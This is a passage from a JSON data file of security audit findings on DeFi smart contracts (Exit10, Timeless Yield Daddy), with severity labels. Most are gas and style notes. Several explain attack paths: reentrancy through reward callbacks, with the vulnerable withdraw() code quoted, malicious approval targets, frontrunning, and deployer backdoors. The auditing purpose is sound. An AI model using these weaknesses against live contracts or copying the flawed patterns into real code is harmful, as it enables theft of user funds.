        "body": "NatSpec is a good way to explain your code to other developers modifying or forking a project, to users who want to understand what the contracts are doing, and to auditors who are trying to determine whether the contract logic is implemented properly. The contracts of Exit10 have a severe lack of detailed NatSpec comments which makes it harder to understand the developer's intentions.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "41. Use abstract contract",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "Defining contract that is not deployed as abstract is a good practice to avoid confusion.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "42. Solidity version",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "Solidity version 0.8.0 introduced a lot breaking changes. It would be good to define the same Solidity version for all contracts. Version above 0.8.0 don't need imported SafeMath library and abicoder v2 is enabled by default.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "43. Non-descriptive variable and function names",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "Some variable names could be improved: exitBucketFinal set in exit10() is a very confusing name for a variable that contains the liquidity of the exit bucket and the bootstrap bucket. Consider changing the variable name to exitBucketBootstrapBucketFinal. exitBucketRewards is the amount of withdrawn USDC from the exitBucketFinal liquidity amount. This liquidity amount includes the exit bucket and bootstrap bucket liquidity so it would be better named exitBucketBootstrapBucketRewards. _getActualLiquidityPerExit is the estimated liquidity per EXIT token assuming MAX_EXIT_SUPPLY of EXIT is minted and redeemed. This is not always a valid assumption, because MasterchefExit.stopRewards() will burn the undistributedRewards if periodFinish is not reached. This function would be better named _getActualLiquidityPerExitAfterPeriodFinish. BOOTSTRAP_TARGET and BOOTSTRAP_CAP would be better described by the names BOOTSTRAP_LIQUIDITY_TARGET and BOOTSTRAP_LIQUIDITY_CAP. percentFromTaget would be better described with percentFromBootstrapTarget. _getPercentFromTarget() can return values that represent over 100%, so the word \"percent\" should be removed from the name of this function because a value representing 100% is meaningless. Consider instead getDollarPerExit() or getValuePerExit().",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "44. Outdated documentation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The documentation describing the Exit10 buckets could be improved by adding a section for the bootstrap bucket.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "45. Replace magic numbers with constants",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The value 5000 appears on this line of Exit10.sol but there is no explanation for what this value represents. It looks like it represents the value 50% with a PERCENT_BASE of 10_000, but it turns out the 5000 value has nothing to do with a percentage. Instead, it helps set the price floor of the EXIT token, and a percentage over 100% only signifies a higher price. A constant variable with a clear name would make it easier to understand what is happening in this function. Arguably the",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "46. Typos",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The _getLiquidityForBootsrapTarget function name was missing a t in Bootstrap and so was this comment. In addition, variable percentFromTaget on Exit10.sol lines 479 and 480 has a typo, it should be percentFromTarget instead.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "47. Unclaimed rewards can be added to user's reward debt",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The _safeClaimRewards function calculates the amount of underlying reward tokens a user may claim for their staked position. This function is called during deposit or withdraw operations. It sets the claimable amount to the lesser of the remaining rewards in the contract or the user's eligible rewards. It then transfers this amount to the user. In both the deposit and withdraw functions, the rewardDebt is then set to be eligible for 0 rewards regardless of the results of the claimed rewards.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "48. Remove unnecessary address casting",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "In the file AMasterchefBase.sol there are multiple unnecessary address casting at L51 and L121.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "49. Remove unnecessary virtual marker",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The function _updateUndistributedRewards() can drop the virtual marker because it is not overridden in child contract.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "50. Potentially unnecessary line of code",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "It is likely that this line of logic in MasterchefExit is never reached. In fact, if it is reached it means that the Masterchef contract has accumulated debt by paying out more rewards than it should have. If this scenario ever occurs, it means there is a problem with another part of the protocol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "51. (Out of scope file) Ensure that Bond NFT contract is initialized with non-zero TRANSFER_LOCKOUT_PERIOD_SECONDS",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "Bond NFTs are tradeable ERC721s that represent the holder's share of the liquidity in the protocol's pendingBucket. When a user converts or cancels the bond, the NFT still exists but has its status in Exit10's idToBondData mapping changed to converted/canceled, rendering it unusable for protocol functions. To avoid situations where a user converts/cancels their bond and immediately sells it to an unsuspecting buyer, the following check in NFT.sol#beforeTokenTransfer() exists: require( status == uint8(Exit10.BondStatus.active) || block.timestamp >= endTime + TRANSFER_LOCKOUT_PERIOD_SECONDS, 'NFT: Cannot transfer during lockout period' ); In the current tests, the value of TRANSFER_LOCKOUT_PERIOD_SECONDS is initialized to zero. This would allow a malicious user to bypass the lockout period and sell their bond immediately.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "52. Potential lock funds if USDC implements taking fee mechanism in the future",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "USDC contract is now using proxy pattern, which indeed could change business logic in the future. In case USDC takes fee on transfers before ETH 10k, Exit10 users can not claim total amount of USDC from system, i.e. at least the latest user can not claim his full amount because contract balance deducted by fee from earlier claim",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "53. Bonds may convert less EXIT tokens than users expect",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The summation of convertible liquidity can exceed the cap EXIT token cap: $$\\sum_{i=1}^n (\\frac{l_{it}}{r_{it}}) \\geq E_S$$ Where: $l_{it}$ is the convertible liquidity of bond $i$ at time $t$; $r_{it}$ is the rate of liquidity per EXIT token that bond $i$ will receive at time $t$; $E_s$ is the EXIT token supply cap. The rate of liquidity per token for a bond at time ${t}$ to receive $r_{it}$ is the larger of two values: the projected liquidity per token $r_p$ and actual liquidity per token $r_a$. The formula for $r_p$ is: $$r_p=p_t*L_{USDC}$$ Where: ${p_t}$ is the percentage of collected bootstrap liquidity to its target, floored to 50%. In other words, if less than 50% of the target was reached, $p_t=0.5$. $L_{USDC}$ is a constant: the projected amount of liquidity per USDC; For $r_a$ the formula is: $$r_a=\\frac{e_l}{E_s}$$ Where: $e_l$ is the available liquidity to be claimed by EXIT holders from the exit bucket (i.e. 70% of the exit bucket); $E_s$ is the exit token supply cap. To break the invariant and fall in the case where the token cap exceeds we assume: Less than or 50% of the bootstrap target was reached (i.e. $p_t=0.5$); Not enough liquidity accumulated in the exit bucket and $r_a<=r_p$. So we have: $$r_p=r_a=\\frac{L_{USDC}}{2} = \\frac{e_l}{E_s}=r_{it}$$ The amount of EXIT tokens a bond $i$ is entitled to at time $t$ (before the discount is added) $e_i$ is: $$e_i=\\frac{l_{it}}{r_{it}}$$ The convertible liquidity cap (i.e. the point from which the entire EXIT supply is minted and all other bonds receive 0 EXIT tokens per liquidity) can be defined by setting the amount of tokens received to the supply $e_i=E_s$. Solving for $r_p$ and $r_a$: $$e_i=\\frac{2*l_{it}}{L_{USDC}} =\\frac{l_{it}}{e_l}*E_s=E_s$$ From here, we can make two observations: If the ratio between the bond's convertible liquidity $l_{it}$ to the liquidity in the exit bucket $e_l\\geq 1$ or; If the bond's convertible liquidity $l_{it} \\geq \\frac{E_s*L_{USDC}}{2}$ , i.e. $l_{it} \\geq 6437989144.5 * 10^7$ assuming 10mi EXIT. The bond would mint the entire EXIT supply and all bonds will receive 0 EXIT on conversion. Note: To simplify modeling we are using one massive bond, but this behavior is equivalent if the liquidity is split in multiple bonds. In other words, the two observations above still apply if we replace $l_{it}$ with $\\sum_{k=1}^n(l_{it})$ as what matters is that the aggregate convertible liquidity. Note that as the code is, people can still create new bonds even after the supply cap is reached.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "54. Masterchef is vulnerable to reentrancy attacks",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "In both functions, rewards are sent to the caller before state is updated to reflect the claim. If the implementation of the reward token contains callbacks or hooks that would grant control to the caller, such as an ERC777, then it is possible to execute a reentrancy attack to steal the reward tokens from the contract. Using the withdraw() as an example, we can see that tokens are transferred in line 101 and state is updated in lines 103-105. 094: function withdraw(uint256 pid, uint256 amount) public { 095: PoolInfo storage pool = poolInfo[pid]; 096: UserInfo storage user = userInfo[pid][msg.sender]; 097: _updatePool(pid); 098: 099: amount = Math.min(user.amount, amount); 100: 101: _safeClaimRewards(pid, _getUserPendingReward(user.amount, user.rewardDebt, pool.accRewardPerShare)); 102: 103: user.amount -= amount; 104: user.rewardDebt = (user.amount * pool.accRewardPerShare) / PRECISION; 105: pool.totalStaked -= amount; 106: _transferAmountOut(pool.token, amount); 107: 108: emit Withdraw(msg.sender, pid, amount); 109: } If the caller receives control during the call to _safeClaimRewards() (which transfers the reward token), an attacker can reenter the function and execute the claim again, since the state hasn't been updated yet, in particular line 104 which tracks how many rewards have been already sent to the user. A test with a proof of concept for this issue is available here.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "55. Event not emitted when adding a token.",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "56. Centralization risk during protocol bootstrap",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "During bootstrap, different contracts need to be created separately by the deployer of the protocol before they are put together in their final configuration. During this period of time, the deployer is the owner of these contracts that are later transferred to the Exi10.sol contract. BLP, STO, BOOT and EXIT tokens used in the protocol are created during the initialization. As these contracts grant the owner the ability to arbitrarily mint tokens, a malicious deployer can mint any number of tokens they want before transferring control to the main contract. Another example attack would be to backdoor the Masterchef.sol or MasterchefExit.sol contracts by configuring another pool with a fake token, which can then be used to steal rewards.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Incorrect order of operations in LibCompound.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The problematic computations are for the variables interestAccumulated and the return value. interestAccumulated calculation from transmissions11/libcompound repo: uint256 interestAccumulated = (borrowRateMantissa * (block.number - accrualBlockNumberPrior)).mulWadDown( borrowsPrior ); interestAccumulated calculation from local LibCompound.sol contract: uint256 interestAccumulated = borrowRateMantissa * block.number - accrualBlockNumberPrior.mulWadDown(borrowsPrior); Made up example values: borrowRateMantissa = 1000000000 block.number = 15460000 accrualBlockNumberPrior = 15459990 borrowsPrior = 500000000000000000000000 interestAccumulated result from transmissions11/libcompound: 5000000000000000 interestAccumulated result from local LibCompound.sol: 15452270005000000 Return value calculation from transmissions11/libcompound repo: (totalCash + totalBorrows - totalReserves).divWadDown(totalSupply); Return value calculation from local LibCompound.sol contract: totalCash + totalBorrows - totalReserves.divWadDown(totalSupply); Example values loosely taken from cDAI: totalCash = 400000000000000000000000000 totalBorrows = 300000000000000000000000000 totalReserves = 20000000000000000000000000 totalSupply = 3100000000000000000 Return value result from transmissions11/libcompound: 219354838709677419354838709 Return value result from local LibCompound.sol: 693548387096774193548387097",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. User can set arbitrary approveMaxIfNeeded() target",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "This finding is not a complete attack chain, but the missing link of the chain depends on a hypothetical weakness in an external contract, which is out of scope of this review. In order for value to be stolen from Swapper.sol, a malicious actor would: Create a malicious contract that is approved by Swapper.sol for ERC20 tokens that pass through Swapper.sol, which enables it to transferFrom() those tokens Use an external call from Swapper.sol to call the malicious contract while Swapper.sol holds value to take that value before it can be sent to the user calling the contract The first step is possible because the input argument to approveMaxIfNeeded() in Swapper.sol code is a user-specified argument. Not only that, but in a function such as _swapXpytToUnderlying(), the args.gate parameter approved for args.xPYT here is only used for one function call, exitToUnderlying(). This function could be implemented in a malicious contract as an empty function and the rest of the _swapXpytToUnderlying() function would still succeed, allowing the args.gate user-specific argument to be set to an address under the malicious user's control. Even worse, this exitToUnderlying() could be where the transferFrom() call happens, so if an innocent user specifies this value for the args.gate value (either due to a mistake, a Timeless frontend hack, or any other means), the value would be transferred to the malicious gate contract and the innocent user would lose the value that was going to be sent to them. It is not even necessary for the user to provide a malicious value for args.gate for this to become a problem. Multiple external calls exist within the functions of Swapper.sol, and if any of these are insecure or have an external call to an insecure contract, loss of value can occur even if the user's transaction has the proper function argument values set.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Lack of slippage protection in Curve swaps",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The exchange() call in _swap() in CurveV2xPYT.sol sets a minimum output token quantity of zero. This means the swap will happen regardless of how imbalanced the pool is. The only check that is applied to the quantity of tokens received is validating the amount is greater than minXpytAmountOut. The value of minXpytAmountOut does not help with slippage and is not user customizable, it only helps avoid a case where a very small (near zero) amount of of xPYT is returned. This is in contrast to where pool.exchange() is used in _swapFromUnderlying() in the swapper repository. There is a check of tokenAmountOut < args.minAmountOut in Swapper.sol to check the return value of pool.exchange(). Whether the args.minAmountOut value will be calculated properly in the user interface is outside the scope of this review, but at least users have the option to specify a slippage tolerance. Similarly, the output of the swapAmountOut return value from _swapFromYieldToken() is compared against args.minAmountOut in Swapper.sol.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Accrued rewards may not be returned to depositors",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The claimRewards() function is an external function without access controls, so anyone can call it. When it is called, the liquidity mining incentive rewards accrued to the aTokens held by the ERC4626 vault are sent to the address rewardRecipient. The rewardRecipient address may be a previously audited contract that is out of scope of this review, but because it is not in the scope of this review, it is not clear whether users will receive rewards claimed from this function.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Bypass to add cEtherAddress to underlyingToCToken array",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The CompoundERC4626Factory.sol constructor has an if statement that prevents cEtherAddress from getting added to the underlyingToCToken array. The updateUnderlyingToCToken() function has a for loop very similar to the constructor, but the if statement check is missing. Because updateUnderlyingToCToken() has no access controls, anyone can use updateUnderlyingToCToken() to add the cEtherAddress to the array. This will cause problems because the CompoundERC4626.sol code assumes ERC20 tokens when using imported SafeTransferLib functions and does not use safeTransferETH() for the case where ETH is the underlying asset.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Improper wrapEthInput() call can cause value loss",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "If a user calls wrapEthInput() as a separate transaction, ether will be converted to WETH and deposited to the Swapper.sol address. Even if the user intends to call swapUnderlyingToXpyt() or swapUnderlyingToNyt() in their next transaction, the user can be frontrun. Whoever calls swapUnderlyingToXpyt() or swapUnderlyingToNyt() while Swapper.sol holds value can extract that value because those functions use args.underlying.balanceOf(address(this)) for the value of tokenAmountIn (here and here).",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. ERC20 tokens sitting in contracts can be extracted",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The Swapper.sol contract uses the code args.TOKEN.balanceOf(address(this)) in several places. The value of args.xPYT, args.pyt, or args.nyt can be any address, which means any token balance stored by the contract can be queried, and soon after extracted, with this code. The contract is not designed to store value, but if it does store value (say if a user accidentally sends tokens directly to the contract), the value could be extracted in a backrun transaction. A similar scenario exists with Uniswap's V2 router, which is not designed to store any token balances but it does have non-zero token balances as seen on etherscan. Separately, sweep() in xPYT.sol is described with Uses the extra asset balance of the xPYT contract to mint shares. This can remove any extra assets of token asset that sits in the xPYT.sol contract. While less generalize than the Sweeper.sol contract, a more specific case of the same issue exists.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Difficult to use withdraw() with full deposit",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "Aave allows users to submit the value type(uint256).max to withdraw the user's full balance. No similar feature is present in the Yield Daddy ERC4626 vault. This makes it hard to use withdraw() while specifying the correct value of assets to remove all aTokens from the vault because the aTokens are rebasing and increasing over time. In contrast, the redeem() function allows a user a specify the number of shares they want to withdraw. Shares are not always rebasing and are easier for a user to specify an accurate number for a complete withdrawal.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Inaccurate function return values",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The maxDeposit() and maxMint() functions only return the value type(uint256).max when the underlying pool can accept a deposit or mint. The value type(uint256).max does not accurately represent the maximum value that can be deposited into the vault when some ERC4626 tokens have already been minted. This is because the vault normally can mint a maximum of type(uint256).max, otherwise the totalSupply state variable will overflow and cause a revert, so the existing token supply should be subtracted. The same is true for aTokens, which should have the existing supply excluded. EIP4626 defines this requirement for maxMint(): MUST return the maximum amount of shares mint would allow to be deposited to receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). The output of maxDeposit() cannot be passed into withdraw() without a revert, which does not satisfy this ERC4626 requirement. A more accurate return value for maxDeposit() in Aave V2 and Aave V3 is: return type(uint256).max - aToken.totalSupply(); The totalSupply value limitation of the ERC4626 vault can be ignored because the totalSupply of the vault will always be less than or equal to aToken.totalSupply(), so the aToken totalSupply is the limiting factor. The same issue is relevant for maxMint(), but the return value of maxMint() should be in units of shares instead of assets because the ERC4626 mint() function takes a shares value as input. The more accurate return value for maxMint() in Aave V2 and Aave V3 is therefore: return convertToShares(type(uint256).max - aToken.totalSupply()); This issue is present in the Compound ERC4626 wrapper as well. A similar solution should be applied.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. No fee-on-transfer token support",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "Fee-on-transfer tokens have the property where the value that is sent is not the same as the value that is received. This difference in logic compared to standard ERC20 tokens requires special handling in solidity to avoid a revert or loss of value. No fee-on-transfer ERC20 appears to exist on the supported lending platforms at the time of the review, but if one is added in the future or if the fee is enabled on an existing token that supports fee-on-transfer, the ERC4626 wrappers for protocols that require two separate transfers for depositing and withdrawing (Euler, Compound, Aave only for depositing) would not function with fee-on-transfer tokens because the deposit or withdraw process would revert because the fee is not accounted for in between the two transfers. The swapper repo also lacks fee-on-transfer support. This is because the tokenAmountIn value used in the safeTransferFrom() call is assumed to equal the value held by the Swapper.sol contract after the transfer takes place. This will revert when args.gate.enterWithUnderlying() is called because the underlying.safeTransferFrom() call in Gate.sol's enterWithUnderlying() will not have sufficient balance to transfer.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Curve's price_oracle() may provide less effective sandwiching protection post-merge",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "In the upcoming Merge of the Ethereum mainnet, block proposers and validators are assigned randomly 2 epochs in advance. This enables an attacker with a sufficient amount of capital to fully manipulate the contents of two or more blocks in a row, undermining previous the security assumption that arbitrageurs could disrupt a multi-block oracle manipulation attack. This risk is compounded by price oracles that put more weight on recent observations, such as Curve's EMA oracle.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Insufficient SwapArgs input validation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "There is no validation in _swapUnderlyingToNyt() that confirms that the addresses of args.underlying, args.nyt, args.pyt, args.xPYT, and args.vault are all related to the same underlying asset. Similarly, the value args.gate may not hold the address of the actual Gate.sol contract in the timeless protocol, but instead may be the address of an attacker's contract. An external call is made to args.gate in _swapUnderlyingToNyt() and _swapUnderlyingToXpyt(), and although the external functions swapUnderlyingToNyt() and swapUnderlyingToXpyt() have the nonReentrant modifier, there is no global reentrancy lock across the Timeless protocol(s), so the risk of a hack involving reentrancy is not zero.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Curve Swap design may generate unexpected NYT/PYT dust",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "According to the documentation, CurveV2Swapper's swapNytToUnderlying() and swapXpytToUnderlying() functions are intended to be used in conjunction with CurveV2Juggler.juggleXpytInput() and CurveV2Juggler.juggleNytInput() respectively. These two juggle function are intended to operate as off-chain oracles which are used to calculate the correct quantities of NYT/PYT tokens to be swapped. The goal of the swap is for the user to end up with a nominally equivalent number of NYT+PYT tokens for a vault, which are then redeemed in equal amounts for xPYT tokens, which is then redeemed for the underlying vault's token. The decoupling of the off-chain price oracle with the on-chain swap introduces a chance that the swap is executed at a different price that the price oracle expected. If a swap is executed at a different price than the oracle predicted, then the user will have differing quantities of NYT and PYT, and will have some amount of dust remaining after they redeem their NYT+PYT for xPYT.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. xPYT deployment lacks trust mechanism",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "Often the CREATE2 opcode is used to deploy contracts that depend on underlying parameters, because the address of the contract can be derived from those underlying parameters. This is the approach used in deployYieldTokenPair() of Factory.sol to deploy new NYT/PYT pairs and by Uniswap V2 to deploy new pairs. But because multiple xPYT tokens can exist for a single underlying vault, perhaps CREATE2 cannot be used in this case. There is no state variable in CurveV2xPYTFactory.sol that stores the address of deployed xPYT contracts, which means that functions that accept a xPYT address as a function argument, including several functions in Swapper.sol that have a SwapArgs.xPYT function argument, cannot determine whether the xPYT address is a legitimate xPYT token or a malicious contract. This is unlikely to impact most users who use a web interface in their browser, but it may open up an attack vector of a malicious contract posing as a legitimate xPYT token.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Missing PYT/NYT lookup mechanism",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The PerpetualYieldToken.sol and NegativeYieldToken.sol contracts contain many external calls to the gate contract, notably the gate.beforePerpetualYieldTokenTransfer() call in PYT's transfer() and transferFrom() functions and the gate-protected gateMint() and gateBurn() in BaseERC20.sol. If the gate is malicious, it could leverage these callbacks for a variety of attack vectors.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Replace require blocks with errors",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "Instances of require that can be replace with custom errors are found in: AaveV2 AaveV3 xPYT",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Declare variables internal, immutable, or constant when possible",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "Many public immutable variables exist in the Euler, Aave V2, Aave V3, and Compound wrappers. If possible, make these internal instead of public for gas savings. There is one variable in xPYT.sol, assetBalance, that can be made private because it already has a public getter function in the form of totalAssets(). A variable in CurveV2xPYT.sol, curvePool, can be made immutable because it is only changed once, in the initializer.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Remove beforeWithdraw() calls",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "withdraw() and redeem() call beforeWithdraw(), but beforeWithdraw() is never implemented with code. beforeWithdraw() is declared in ERC4626.sol as an empty virtual function. The calls to beforeWithdraw() can be removed because it doesn't run any code.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Replace duplicate code with internal function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The code below is found in two places in AaveV2ERC4626.sol (here and here): // check if pool is paused if (lendingPool.paused()) { return 0; } // check if asset is paused uint256 configData = lendingPool.getReserveData(address(asset)).configuration.data; if (!_getActive(configData)) { return 0; } This code could be moved into an internal view function to reduce contract deployment costs. The same could be done with the similar duplicate code block (here and here). The Aave V3 wrapper has duplicate code in the same functions of maxDeposit(), maxMint(), maxWithdraw(), and maxRedeem().",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Declare functions external for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "There is a public function updateUnderlyingToCToken() in CompoundERC4626Factory.sol that can be made external.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Use claimComp() with borrowers = false",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "claimComp() is called in claimRewards(). It can be replaced with a call to the other claimComp() function with borrowers set to false.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Use unchecked if no underflow risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "There are two subtraction operations (here and here) that should not underflow because the supplyCap should be greater than the value of totalSupply(). The Aave V3 code should be checked to confirm that there is a valid comparison to supplyCap when the supply increases. Another subtraction operation can be made unchecked in CurveV2Juggler.sol (and the out of scope UniswapV3Juggler.sol contract), found here and here. This operation can be unchecked because tokenAmountIn >= (tokenAmountIn >> 1), and because swapAmountIn = (tokenAmountIn >> 1), then tokenAmountIn >= swapAmountIn and tokenAmountIn - swapAmountIn >= 0. Swapper.sol has two operations repeated four times that can be unchecked to save gas. A similar operation that already is unchecked is found in xPYT.sol. Division here, here, here, and here can be unchecked because (protocolFeeInfo_.fee / 10000) < 1 so it cannot overflow. uint256 feeAmount = (tokenAmountIn * protocolFeeInfo_.fee) / 10000; Subtraction here, here, here, and here can be unchecked because feeAmount < tokenAmountIn so it cannot underflow. tokenAmountIn -= feeAmount;",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Function arg should be calldata not memory",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "The Compound factory contract has a memory argument that can be changed to calldata for gas savings. The same change can be made for _deployCurvePool() in CurveV2xPYTFactory.sol.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Move revert earlier in function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "This revert check in the xPYT constructor can take place earlier in the constructor because it only relies on a function argument and does not rely on any other calculations. Move this if statement to immediately follow the other if statement revert check.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Internal function is cheaper than modifier",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "This onlyOwner modifier could be replaced with a require check in this function or an internal function. For example, add this line to ownerSetProtocolFee() to replace the modifier on the function. require(msg.sender == owner, \"UNAUTHORIZED\");",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. Zero check could save gas",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md",
        "body": "getClaimableYieldAmount() is called once in xPYT.sol, but this function is missing a zero check for yieldAmount. The first function that calculates the claimable yield, claimYieldAndEnter(), confirms that yieldAmount != 0. The other locations where the claimable yield is calculated, getClaimableYieldAmount, does not confirm that yieldAmount != 0. This zero check could provide a gas savings in the case that yieldAmount is zero.",
        "labels": [
